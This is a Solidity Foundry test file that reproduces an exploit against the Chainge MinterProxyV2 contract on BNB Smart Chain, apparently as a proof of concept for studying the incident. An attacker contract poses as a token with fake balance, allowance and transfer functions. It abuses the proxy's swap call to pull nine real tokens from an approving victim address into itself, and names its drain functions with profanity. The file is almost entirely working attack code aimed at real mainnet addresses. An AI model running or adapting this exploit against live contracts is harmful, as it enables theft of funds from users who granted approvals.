// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IPancakeV2.sol";

import "./IMinterProxyV2.sol";

IMinterProxyV2 constant minterProxy = IMinterProxyV2(
    payable(0x80a0D7A6FD2A22982Ce282933b384568E5c852bF)
);

address constant BUSDT = 0x55d398326f99059fF775485246999027B3197955;
address constant BabyDoge = 0xc748673057861a797275CD8A068AbB95A902e8de;
address constant SolToken = 0x570A5D26f7765Ecb712C0924E4De545B89fD43dF;
address constant AvaxToken = 0x1CE0c2827e2eF14D5C4f29a091d735A204794041;
address constant FLOKI = 0xfb5B838b6cfEEdC2873aB27866079AC55363D37E;
address constant ATOM = 0x0Eb3a705fc54725037CC9e008bDede697f62F335;
address constant TLOS = 0xb6C53431608E626AC81a9776ac3e999c5556717c;
address constant IOTX = 0x9678E42ceBEb63F23197D726B29b1CB20d0064E5;
address constant OneInch = 0x111111111117dC0aa78b770fA6A738034120C302;

IERC20 constant Victim = IERC20(0x8A4AA176007196D48d39C89402d3753c39AE64c1);

contract ChaingeHack {
    address admin;
    uint256 index = 9;

    constructor() payable {
        admin = msg.sender;
    }

    function balanceOf(address owner) external view returns (uint256) {
        if (index == 10) {
            if (IERC20(BUSDT).balanceOf(address(Victim)) > 10) {
                return 10;
            }
            return 11;
        }

        if (index == 11) {
            if (IERC20(BabyDoge).balanceOf(address(Victim)) > 10) {
                return 11;
            }
            return 12;
        }

        if (index == 12) {
            if (IERC20(SolToken).balanceOf(address(Victim)) > 10) {
                return 12;
            }
            return 13;
        }

        if (index == 13) {
            if (IERC20(AvaxToken).balanceOf(address(Victim)) > 10) {
                return 13;
            }
            return 14;
        }

        if (index == 14) {
            if (IERC20(FLOKI).balanceOf(address(Victim)) > 10) {
                return 14;
            }
            return 15;
        }

        if (index == 15) {
            if (IERC20(ATOM).balanceOf(address(Victim)) > 10) {
                return 15;
            }
            return 16;
        }

        if (index == 16) {
            if (IERC20(TLOS).balanceOf(address(Victim)) > 10) {
                return 16;
            }
            return 17;
        }

        if (index == 17) {
            if (IERC20(IOTX).balanceOf(address(Victim)) > 10) {
                return 17;
            }
            return 18;
        }

        if (index == 18) {
            if (IERC20(OneInch).balanceOf(address(Victim)) > 10) {
                return 18;
            }
            return 20;
        }
    }

    function allowance(address, address) external pure returns (uint256) {
        return 100;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(
        address,
        address,
        uint256
    ) external pure returns (bool) {
        return true;
    }

    function fuckEveryToken(address token) public {
        index = index + 1;

        bytes memory data = abi.encodeWithSelector(
            this.transferFrom.selector,
            address(Victim),
            address(this),
            IERC20(token).balanceOf(address(Victim))
        );
        minterProxy.swap(
            address(this),
            1,
            token,
            address(this),
            address(this),
            1,
            data,
            hex"00"
        );
    }

    function fuckyou() public {
        fuckEveryToken(address(BUSDT));
        fuckEveryToken(address(BabyDoge));
        fuckEveryToken(address(SolToken));
        fuckEveryToken(address(AvaxToken));
        fuckEveryToken(address(FLOKI));
        fuckEveryToken(address(ATOM));
        fuckEveryToken(address(TLOS));
        fuckEveryToken(address(IOTX));
        fuckEveryToken(address(OneInch));
    }
}

contract ChaingeTest is Test {
    ChaingeHack hacker;

    function setUp() public {
        vm.createSelectFork("bsc", 37_880_388 - 1);
    }

    function testExploit() public {
        hacker = new ChaingeHack();
        hacker.fuckyou();

        emit log_named_decimal_uint(
            "BUSD Balance",
            IERC20(BUSDT).balanceOf(address(hacker)),
            IERC20(BUSDT).decimals()
        );
        emit log_named_decimal_uint(
            "BabyDoge Balance",
            IERC20(BabyDoge).balanceOf(address(hacker)),
            IERC20(BabyDoge).decimals()
        );
        emit log_named_decimal_uint(
            "SolToken Balance",
            IERC20(SolToken).balanceOf(address(hacker)),
            IERC20(SolToken).decimals()
        );
        emit log_named_decimal_uint(
            "AvaxToken Balance",
            IERC20(AvaxToken).balanceOf(address(hacker)),
            IERC20(AvaxToken).decimals()
        );
        emit log_named_decimal_uint(
            "FLOKI Balance",
            IERC20(FLOKI).balanceOf(address(hacker)),
            IERC20(FLOKI).decimals()
        );
        emit log_named_decimal_uint(
            "ATOM Balance",
            IERC20(ATOM).balanceOf(address(hacker)),
            IERC20(ATOM).decimals()
        );
        emit log_named_decimal_uint(
            "TLOS Balance",
            IERC20(TLOS).balanceOf(address(hacker)),
            IERC20(TLOS).decimals()
        );
        emit log_named_decimal_uint(
            "IOTX Balance",
            IERC20(IOTX).balanceOf(address(hacker)),
            IERC20(IOTX).decimals()
        );
        emit log_named_decimal_uint(
            "OneInch Balance",
            IERC20(OneInch).balanceOf(address(hacker)),
            IERC20(OneInch).decimals()
        );
    }
}
